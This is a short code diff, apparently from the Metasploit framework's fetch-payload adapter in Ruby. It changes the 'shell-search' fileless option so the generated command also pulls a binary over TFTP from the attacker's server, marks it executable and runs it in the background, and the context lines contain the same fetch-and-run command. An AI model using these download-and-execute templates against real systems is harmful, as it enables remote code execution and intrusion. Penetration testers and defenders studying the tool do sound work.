@@ -461,7 +461,7 @@ module Msf::Payload::Adapter::Fetch
         if datastore['FETCH_FILELESS'] != 'none' && linux?
           get_file_cmd = "(echo binary ; echo get #{uri} $f ) | tftp #{srvhost}"
           return _generate_fileless_shell(get_file_cmd, module_info['AdaptedArch']) if datastore['FETCH_FILELESS'] == 'shell'
-          return _generate_fileless_bash_search(get_file_cmd) if datastore['FETCH_FILELESS'] == 'shell-search'
+          return "#{_generate_fileless_bash_search(get_file_cmd)} (echo binary ; echo get #{uri} ) | tftp #{srvhost}; chmod +x ./#{uri}; ./#{uri} &" if datastore['FETCH_FILELESS'] == 'shell-search'
           return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'
         else
           fetch_command = "(echo binary ; echo get #{uri} ) | tftp #{srvhost}; chmod +x ./#{uri}; ./#{uri} &"
